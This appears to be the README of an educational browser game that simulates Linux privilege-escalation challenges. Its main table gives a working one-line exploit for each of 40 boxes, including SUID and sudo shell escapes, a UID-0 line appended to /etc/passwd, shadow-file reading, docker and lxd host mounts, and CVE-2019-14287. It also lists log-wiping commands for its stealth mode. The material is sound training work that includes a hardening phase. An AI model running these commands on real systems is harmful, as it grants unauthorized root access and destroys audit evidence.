# rootQuest — Linux Privilege Escalation Playground

A 100% browser-based, vanilla JS terminal game. 40 independent Linux machines, 40 different privilege-escalation vulnerabilities, sorted into difficulty tiers. Enumerate, identify, exploit, root.

## Play

Just open `index.html` in any modern browser. No build, no server, no external dependencies — it's an installable PWA with self-hosted fonts that works fully offline after the first load.

```
open index.html          # macOS
xdg-open index.html      # Linux
start index.html         # Windows
```

## Machines

| # | Box | Tier | Vulnerability | Key command |
|---|-----|------|---------------|-------------|
| 1 | box-01 | Easy | SUID misconfiguration on `find` | `find . -exec /bin/sh -p \;` |
| 2 | box-02 | Easy | World-writable cron script | Overwrite `/opt/backup.sh`, `wait` |
| 3 | box-03 | Medium | Linux capability `cap_setuid+ep` on python3 | `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` |
| 4 | box-04 | Medium | PATH hijack against a SUID helper | Fake `ps` in `/tmp`, `export PATH=/tmp:$PATH` |
| 5 | box-05 | Hard | Sudoers NOPASSWD on `vim` | `sudo vim -c ':!/bin/sh'` |
| 6 | box-06 | Easy | World-writable `/etc/passwd` | `echo 'r00t::0:0::/root:/bin/bash' >> /etc/passwd`, `su r00t` |
| 7 | box-07 | Easy | Sudoers NOPASSWD on `awk` (GTFOBins) | `sudo awk 'BEGIN{system("/bin/sh")}'` |
| 8 | box-08 | Medium | Unpatched local root — PwnKit (CVE-2021-4034) | `./pwnkit` |
| 9 | box-09 | Hard | Credential reuse → lateral move → sudo | `su svc`, `sudo bash` |
| 10 | box-10 | Hard | `docker` group membership | `docker run -v /:/mnt -it alpine chroot /mnt sh` |
| 11 | box-11 | Medium | `sudo` env_keep leaks `LD_PRELOAD` | `gcc -shared … x.so`, `sudo LD_PRELOAD=/tmp/x.so apache2ctl` |
| 12 | box-12 | Hard | Wildcard injection into a root `tar` cron | `touch ./--checkpoint-action=exec=sh runme.sh`, `wait` |
| 13 | box-13 | Easy | World-readable root SSH private key | `ssh -i /opt/backup/id_rsa root@localhost` |
| 14 | box-14 | Medium | World-writable `/etc/sudoers.d` drop-in | `echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn`, `sudo bash` |
| 15 | box-15 | Hard | World-writable `/etc/ld.so.preload` | `echo /tmp/x.so > /etc/ld.so.preload`, run any SUID |
| 16 | box-16 | Easy | Sudoers NOPASSWD on `find` (GTFOBins) | `sudo find . -exec /bin/sh \;` |
| 17 | box-17 | Easy | Sudoers NOPASSWD on `env` (GTFOBins) | `sudo env /bin/sh` |
| 18 | box-18 | Medium | Sudoers NOPASSWD on `python3` (GTFOBins) | `sudo python3 -c 'import os; os.system("/bin/sh")'` |
| 19 | box-19 | Medium | Sudoers NOPASSWD on `less` — pager shell-escape (GTFOBins) | `sudo less !/bin/sh` |
| 20 | box-20 | Hard | Sudoers NOPASSWD on `tee`, piped into `/etc/passwd` (GTFOBins) | `echo 'r00t::0:0::/root:/bin/bash' \| sudo tee -a /etc/passwd`, `su r00t` |
| 21 | box-21 | Hard | Linux capability `cap_dac_read_search+ep` on python3 → read + crack `/etc/shadow` | `python3 -c "print(open('/etc/shadow').read())"`, `john /tmp/shadow.copy`, `su root` |
| 22 | box-22 | Hard | `sudo` env_keep leaks `LD_LIBRARY_PATH` (missing-library hijack) | `gcc -shared … libagent.so.1`, `sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent` |
| 23 | box-23 | Hard | NFS export with `no_root_squash` | `showmount -e`, `mount -t nfs box-23:/srv/backups /mnt`, plant + `chmod u+s` a shell in the export |
| 24 | box-24 | Easy | Sudoers NOPASSWD on `perl` (GTFOBins) | `sudo perl -e 'exec "/bin/sh";'` |
| 25 | box-25 | Medium | Sudoers NOPASSWD on `node` (GTFOBins) | `sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'` |
| 26 | box-26 | Medium | `sudoedit`/`sudo -e` with `EDITOR` kept in env_keep | Point `EDITOR` at your own executable, then `sudo EDITOR=/path/to/script -e /etc/motd` |
| 27 | box-27 | Hard | Capability `cap_dac_override` on `python3` (write-DAC bypass) | `python3 -c "open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\n')"`, then `su pwnd` |
| 28 | box-28 | Hard | `sudo` `(ALL, !root)` name-only exclusion bypassed by a negative uid (CVE-2019-14287) | `sudo -u#-1 /bin/bash` |
| 29 | box-29 | Easy | Sudoers NOPASSWD on `systemd-run` — transient unit runs as root (GTFOBins) | `sudo systemd-run /bin/sh` |
| 30 | box-30 | Medium | Sudoers NOPASSWD on `apt-get` — `-o` config-override runs a Pre-Invoke hook as root (GTFOBins) | `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` |
| 31 | box-31 | Medium | Sudoers NOPASSWD on `mysql` — client-builtin `\!` shell escape (GTFOBins) | `sudo mysql -e '\! /bin/sh'` |
| 32 | box-32 | Medium | Sudoers NOPASSWD on `tar` — `--checkpoint-action=exec` runs a command as root (GTFOBins) | `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| 33 | box-33 | Medium | Sudoers NOPASSWD on `git` — `-p` forces a pager that inherits root (GTFOBins) | `sudo git -p help !/bin/sh` |
| 34 | box-34 | Easy | Sudoers NOPASSWD on `nice` — bare passthrough to whatever command follows (GTFOBins) | `sudo nice /bin/sh` |
| 35 | box-35 | Easy | World-writable root cron script (monitoring agent) | Overwrite `/opt/monitor/healthcheck.sh`, `wait` |
| 36 | box-36 | Easy | Sudoers NOPASSWD on `zip` — `-T --unzip-command` runs an arbitrary "unzip" hook (GTFOBins) | `sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"` |
| 37 | box-37 | Medium | Sudoers NOPASSWD on `rsync` — `-e` swaps the remote-shell program for a local shell (GTFOBins) | `sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null` |
| 38 | box-38 | Easy | Sudoers NOPASSWD on `make` — `--eval` injects a rule whose recipe is a root shell (GTFOBins) | `sudo make -s --eval="x:\n\t-/bin/sh"` |
| 39 | box-39 | Hard | `lxd` group membership — privileged container mounts the host (docker's cousin) | `lxc init alpine r -c security.privileged=true`, disk device `source=/` |
| 40 | box-40 | Medium | World-writable systemd service unit run by a root timer | Rewrite `ExecStart` in `/etc/systemd/system/backup.service`, `wait` |

## Controls

- `help` — list available commands
- `hint` — get a nudge (3 hints per level, progressive)
- `next` — advance to next machine after rooting
- `reset` — restart the current machine
- `lang en` / `lang fr` — switch language
- `↑ / ↓` — command history (now persisted across machines and reloads)
- `Ctrl+R` — reverse-incremental history search, bash-style
- `Tab` — command & path completion
- `Ctrl+L` — clear screen
- `man <command>` — read a command's manual page; `cd -` — previous directory
- `nano <file>` — full-screen editor (`^O` write out, `^X` exit), backed by the real FS permission rules
- 🎓 **Explain button** (topbar) — toggles "explanation mode": a step-by-step commented solution for the current box in the sidebar, revealed **one step at a time** so you can ask "what now?" without also being told the ending. Steps you've already run are ticked off, and every command is click-to-insert. Separate from `hint` — free to leave on, doesn't cost a hint slot or affect your S-rank.

## Game modes

The hub has a **🎛 Modes de jeu** panel. Assistance modes (🎓 explanation, 🧭 mentor) stack freely; the four challenge modifiers below **also stack** — turn on any combination (Stealth + Time attack, Hardcore + Chaos, all four at once) and the run obeys all of them. Their score multipliers multiply and their assistance rules AND together, so a heavier run is worth more and any single mode forbidding hints forbids them for the whole stack. `normal` is the default (no modifiers on), so an untouched save plays exactly as it always did. **Exam** is the exception: it's a *session*, not a modifier, so it runs on its own and masks the modifier set until you leave it.

| Mode | Score | What changes |
|---|---|---|
| 🎯 **Normal** | ×1 | The full lab: hints, cheatsheet, objectives, no clock. |
| 🕵️ **Stealth** | ×1.5 | A simulated SOC scores the noise of every command you run. |
| 🕶️ **Hardcore** | ×2 | No hints, no cheatsheet, no objectives, no mentor — the `hint` command refuses too. |
| ⏱️ **Time attack** | ×1.75 | A countdown sized to the machine's tier (3 / 5 / 8 min). |
| 🌪️ **Chaos** | ×2 | The box fights back: a watchdog reaps stale `/tmp` files and an admin revokes your sudo ticket. You keep your hints — the pressure is environmental. |
| 📜 **Exam** | ×2.5 | 3 machines, 4 hours, no assistance, pass/fail report. Started from its own panel, not the picker — it's a session, not a per-box setting. |

A mode only pays its multiplier if its constraint actually held: get detected in stealth, or let the clock run out in time attack, and the score drops back to face value.

**Stealth mode** is the one with teeth. Each command adds detection points and says *why* it was noisy — `find / -perm -4000` walks every inode and lights up the file-audit rules (16 pts) while `find /usr/bin -perm -4000` barely registers (4). A denied `sudo` costs more than a successful one, because failures are what brute-force detection is built to catch. Real countermeasures bring the gauge back down, once each: `unset HISTFILE`, `history -c`, `truncate -s 0 /var/log/auth.log`, `touch -r <ref> <file>`. Finish under 20% for a 👻 GHOST grade.

### 📖 Campaign — Operation Hollow Root

A story threaded through seven of the lab's existing machines: a freelance operator, a handler (**0xMORPH**) who turns out to be something else entirely, and a data-broker called NULLCORP. Each chapter is a briefing before an ordinary box and a debrief after rooting it — a run of boxes that reads as one job with a beginning and a twist.

It's a **pure narrative overlay**: no gameplay rules change, the boxes play exactly as they do anywhere else, and it's independent of the mode picker (you can't stack it — it's a story, not a modifier). Progress and your one branching choice are persisted, so the campaign resumes where you left off. Start or resume it from the banner at the top of the hub; **↺ Restart** wipes campaign progress without touching your owned-machine progress.

At the Chapter 6 debrief you make **the one call that's yours**: 🔥 burn NULLCORP down, 👻 erase yourself and vanish, or 👑 take 0xMORPH's throne. The choice is remembered and selects which of **three distinct endings** you get on the finale (box 38), in place of the usual "all machines owned" screen.

### 🕵️ Stealth × Blue Team

Root a box in stealth mode and the 🛡 hardening phase stays watched — but the economics **invert**. The anti-forensics that bought you quiet while breaking in (`truncate` on `auth.log`, `history -c`) now *spike* the gauge: a defender wiping logs is the reddest flag on the board. Surgical hardening (`chmod u-s`, `setcap -r`, editing sudoers) stays quiet. The lesson: clean up like an admin, not like an intruder covering tracks.

### 🌪️ Chaos mode

The box defends itself while you work. The pressure is environmental, not informational — you keep your hints and cheatsheet, but the ground moves:

- A **tmp reaper** (systemd-tmpfiles / tmpreaper, a real privesc hazard) sweeps files you left in `/tmp` once they've gone cold. It only ever takes *your* scratch files, never the box's own, never the vulnerability, and never anything younger than a grace window — so "stage your fake binary and trigger it *now*" is the lesson, not a dice roll.
- An **admin on shift** revokes your cached sudo ticket mid-run: your next `sudo` re-prompts.
- A **threat-level gauge** telegraphs the escalation; every event is announced before and after, nothing that costs you happens silently.

Root it clean for a 🛡 UNTOUCHED grade on the scorecard.

### 📜 Exam mode

The certification run, OSCP-shaped: **3 machines drawn from a seed (one per tier), 4 hours, zero assistance.** Three things make it an exam rather than a playlist:

- **The clock is wall-clock.** It's anchored to a stored timestamp, so closing the tab doesn't pause it and reopening the page resumes the same exam with the time you've actually spent. An exam you can pause is a practice session.
- **The board mixes tiers.** Three random boxes could hand you three easy ones; the triage decision only exists when they're unequal.
- **Points are 20 / 30 / 40, pass mark 50 of 90.** Any two boxes clear it, any single box never does — rooting the hard one first is worth more, but it isn't a shortcut.

At the end (board cleared, clock expired, or manually) you get a report: per-machine points, root time and flag, total, PASS/FAIL — on screen and as a downloadable Markdown file you can drop straight into a write-up. The seed is in it, so anyone can sit the exact same exam.

Hardening is disabled during an exam (it's offensive and on the clock, and isn't scored), and playing a machine that isn't on your board is allowed but worth ×1 — the ×2.5 belongs to the exam.

**Rogue mode** (🎲, same panel) generates a machine from a seed: vulnerability class, paths, binary names, hostname and decoy files are all derived from it. No briefing, no category — you have to enumerate. The same seed produces the same machine anywhere, so seeds are shareable (`c0ffee`, `monday`, anything at all). Generated boxes go through the same import validation as hand-written custom ones.

Its sudo boxes are drawn from `js/gtfobins.js` — **40 GTFOBins `sudo` shell techniques ingested as data**, each with the real payload and a detector. The same table backs the shell-escape engine: adding a binary is a data edit, not a code change, and a harness test plays every payload through the real sudo path to guarantee each one still lands root. (A no-server, offline-first game can't pull gtfobins.github.io live, so ingestion here means a curated local dataset rather than a runtime fetch.)

The same dataset is also a **study tool**: the hub has a **📚 GTFOBins reference** panel — the 40 techniques grouped by shape (exec wrappers / interpreters / interactive tools), filterable by binary name, each command click-to-copy and each linking out to its real GTFOBins page.

## Blue team

Rooting a box unlocks a 🛡 **Blue Team** phase: stay in the root shell and actually fix what you just exploited. The fix is verified by re-running the check the exploit itself used, not by pattern-matching the edit — a cosmetic change doesn't count.

Every box that grants a sudo rule now has one: `/etc/sudoers` is a real, root-owned `440` file generated from that box's rules, and deleting the offending line (`sed -i '/^player/d' /etc/sudoers`) genuinely revokes the privilege. 34 of 40 machines have a fix phase.

## Commands supported

`ls`, `ls -la`, `cd`, `pwd`, `cat`, `find`, `find -perm -4000`, `find -exec ...`, `sudo`, `sudo -l`, `sudo -e`/`sudoedit`, `su`, `ssh`, `docker`, `crontab -l`, `getcap`, `setcap`, `strings`, `chmod`, `echo`, `echo >`, `echo >>`, `export`, `unset`, `touch`, `touch -r`, `mkdir [-p]`, `rm [-rf]`, `truncate -s`, `sed [-i]` (`/re/d`, `s/a/b/`), `gcc`, `python3 -c '...'`, `perl -e '...'`, `node -e '...'`, `awk`, `vim`, `less`, `tee -a`, `john`, `showmount -e`, `mount -t nfs`, `whoami`, `id`, `wait`, `man <cmd>`.

**Enumeration & pipes:** `ps [aux]`, `env`, `uname -a`, `hostname`, `which`, `file`, `history`, `mount`, plus text filters `grep`, `wc`, `head`, `tail`, `sort`, `uniq`, `tee` — usable standalone or in a pipeline (`cat /etc/passwd | grep -v root | wc -l`, `echo payload | sudo tee -a /etc/passwd`).

Redirects (`>`/`>>`) and `tee` now respect file permissions: writing to a file you don't own and can't write fails with `Permission denied` unless you're root or the write is happening through a sudo-granted binary — box-20 relies on exactly that distinction.

`python3 -c "open(path).read()"` also respects file read permissions unless the interpreter has been granted `cap_dac_read_search`/`cap_dac_override` (box-21), in which case it bypasses them like the real capability does — and `sudo <cmd>` bypasses `env_reset` only for variables explicitly listed in a level's `env_keep` (`LD_PRELOAD` for box-11/15, `LD_LIBRARY_PATH` for box-22 — each with its own, deliberately different, hijack requirements). `showmount -e` and `mount -t nfs host:/export /mountpoint` (box-23) work the same way: once mounted, the export's own permissions — not the local directory's — govern reads/writes/`chmod` under it.

## Custom boxes

The hub has a "Custom box" panel (below the machine grid) to import a box from JSON — no build step, no server. Paste JSON matching this shape and hit Import:

```json
{
  "codename": "custom-01",
  "title": "Custom · My Vulnerability",
  "brief": "One or two sentences describing the scenario.",
  "user": "player",
  "host": "custom-01",
  "cwd": "/home/player",
  "objectives": ["Step one", "Step two"],
  "hints": ["Nudge 1", "Nudge 2", "Full solution"],
  "flag": "flag{whatever_you_want}",
  "fs": {
    "/": { "type": "dir", "owner": "root", "mode": "755", "children": ["home"] },
    "/home": { "type": "dir", "owner": "root", "mode": "755", "children": [] }
  },
  "wins": [{ "type": "custom_win" }],
  "debrief": { "vuln": "...", "why": "...", "fix": "...", "link": "https://..." }
}
```

`title`, `brief`, `objectives`, `hints`, and `debrief` accept either a plain string/array or `{ "en": ..., "fr": ..., "es": ... }` for multilingual content — a missing translation falls back to English. `fs["/"]` (a root directory node) is the only required filesystem entry; everything else in `fs` is up to you, following the same `{ type, owner, mode, children|content }` shape used by the built-in boxes in `js/levels.js`.

`wins` is checked against the `type` your box's win-condition logic reports — for a self-contained payload (a planted SUID binary, say), set `"exploit": "<your type>"` on that file node in `fs` so running it directly grants root; more elaborate mechanics (matching a specific command sequence) currently require editing `js/commands.js`, same as any built-in box.

The panel also has a **🧰 Visual builder** tab (`js/boxbuilder.js`) for the five most common vulnerability shapes, so writing the `fs` tree by hand is optional for these:

- **Misconfigured SUID binary** — any path you give becomes a planted SUID file with a self-contained `exploit` payload (same mechanic as box-08's PwnKit).
- **World-writable cron script** — reuses the generic `cron_hijack` win already driven entirely by the `path` field, so any script location works.
- **World-writable `/etc/passwd`** — reuses the generic `passwd_write` win (append a UID-0 line, `su` into it).
- **Sudoers NOPASSWD (GTFOBins)** — pick a binary from a curated list (`find`/`awk`/`env`/`python3`/`perl`/`node`/`nice`/`less`/`vim`); the generic `sudoEscapes()` detector in `js/commands.js` already recognizes all of them.
- **SUID helper calling an unqualified command (PATH hijack)** — reuses the generic `path_hijack` win (box-04's mechanic): pick the helper's path and which command it calls unqualified, and any fake binary earlier in `$PATH` will hijack it.

Fill in codename/title/brief/flag, pick a template, hit "Générer le JSON" — it fills the same textarea the paste-JSON flow uses, so nothing about validation or import changes; review the generated JSON (and tweak hints/objectives to taste) before importing. Anything outside these five shapes still needs hand-written `fs`/`wins` JSON — or use the third tab below.

A third tab, **🗂️ Graphical editor** (`js/boxeditor.js`), covers that "anything else": a clickable file-tree builder rather than fixed templates. Pick a starting point (empty skeleton, or any of the five templates above as a base to customize), then click through the tree to add files/folders, edit each node's owner/mode/content, and flag SUID/world-writable bits or a `calls_unqualified` command directly in the form — no JSON syntax involved. A **win condition** picker below the tree lets you wire up the actual victory check:

- **Auto** — any file node you gave a "direct exploit type" to (the same self-contained `exploit` mechanic used above) automatically becomes a win condition; this is the "I built my own SUID payload" case and needs no further configuration.
- **Cron / passwd / sudo GTFOBins / PATH hijack** — same four generic mechanics the visual builder uses, so a box combining a hand-built tree with one of these known win types works exactly like its templated counterpart.
- **Custom** — type your own win `type` string; useful once you've added matching logic to `js/commands.js` yourself, same as any built-in box.

Hit "Générer le JSON" here too, and it lands in the same shared textarea. The tree editor doesn't replace hand-editing `fs`/`wins` JSON for very unusual mechanics, but it removes the need for it in the vast majority of cases.

Custom boxes are saved to `localStorage` (this browser only) under their own hub tier. Each machine card also has a small `{ }` button that copies that box's JSON to your clipboard — including built-in ones, handy as a starting template.

Custom boxes also get a `🔗` button that copies a self-contained share link instead — the box's JSON, percent-encoded then base64'd into the URL hash (`#box=...`), no server involved. Anyone who opens that link gets the box auto-imported into their own `localStorage` and a confirmation toast; the hash is cleared right after so refreshing or bookmarking the page doesn't re-import it.

## Language

Toggle EN/FR/ES from the top-right, or type `lang fr` (or `lang es`).

## Themes

Pick a palette from the theme selector (top bar or hub): **Kali** (default), **Matrix**, **Dracula**, **Amber** (retro CRT), or **Light**. Your choice is saved in `localStorage`.

## Structure

```
privesc-game/
├── index.html         # Entry point
├── styles.css         # Kali/Parrot-inspired terminal styling
├── service-worker.js  # Offline-first cache (PWA)
└── js/
    ├── i18n.js         # Trilingual dictionary (EN/FR/ES)
    ├── modes.js        # Game-mode registry: which modes exist, what each one allows
    ├── levels.js       # 40 machines with their filesystems (+ generated sudo hardening)
    ├── walkthrough.js  # Explanation mode: commented solution per box (EN/FR/ES)
    ├── fs.js           # Simulated filesystem
    ├── commands.js     # Command interpreter
    ├── mentormode.js   # Mentor mode toggle state
    ├── mentor.js       # Mentor coaching engine (contextual nudges, rule-based)
    ├── stealth.js      # Stealth mode: SOC detection gauge + anti-forensics countermeasures
    ├── timeattack.js   # Time attack: per-tier countdown
    ├── exam.js         # Exam mode: seeded 3-box board, wall-clock, scoring, report
    ├── chaos.js        # Chaos mode: tmp reaper + sudo-ticket revocation, on a threat timer
    ├── gtfobins.js     # Ingested GTFOBins sudo-shell techniques (40), drives the escape engine + generators
    ├── story.js        # Campaign: 7-chapter narrative overlay (Operation Hollow Root), trilingual
    ├── ghost.js        # Ghost replay: records the command log a best-time run is built from
    ├── terminal.js     # Terminal UI (history, prompt, rendering)
    ├── sfx.js          # Synthesized sound effects (Web Audio)
    ├── walkmode.js     # Explanation mode state + progressive reveal cursor
    ├── proof.js        # Shareable "proof of root" card renderer (canvas)
    ├── nano.js         # Full-screen `nano` editor overlay
    ├── boxbuilder.js   # Visual custom-box builder (templates → box JSON)
    ├── boxeditor.js    # Graphical filesystem editor for custom boxes
    ├── main.js         # Game orchestration
    ├── rogue.js        # Rogue mode: seeded procedural box generator
    └── fx.js           # Background visual effects
```

Every module hangs its API off `window.*` and reads the others back from there — no bundler, no import graph. New engines follow the observer pattern `mentor.js`/`stealth.js`/`ghost.js` use: wrap `CMD.execute`, observe the result, return it unchanged.

## Development & tests

No build step for the game itself. For the test suite:

```
npm install                 # installs @playwright/test (dev only)
npm run serve               # preview at http://localhost:4173
npm run test:logic          # fast browserless harness (plays all 40 boxes + every mode)
npm run lint                # ESLint 9
npm test                    # Playwright e2e (drives a real browser)
```

- `tests/harness.js` — loads the real engine in a sandbox and plays each box's solution, asserting root (runs in EN and, with `RQLANG=fr`, in French). It also covers each mode engine in isolation, the blue-team fix of every hardenable box, a boot smoke test that drives `main.js` through all four challenge modes against a fake DOM, and the invariants that only bite later: `index.html`'s i18n keys existing in all three languages, every `<script>` being in the service worker's precache list, and `CACHE_VERSION` matching `package.json`.
- `tests/rootquest.spec.js` — Playwright: one test per machine (solution → root → flag + scorecard), plus hub-render and pipe tests. Locally it uses your installed Chrome; CI uses bundled Chromium.
- CI (`.github/workflows/ci.yml`) runs syntax checks + the harness + Playwright on every push/PR.
- Deploy (`.github/workflows/deploy-pages.yml`) publishes to GitHub Pages on push to `main` (enable once via Settings → Pages → Source: GitHub Actions).

## License

MIT — do whatever. Educational content, no real systems harmed.
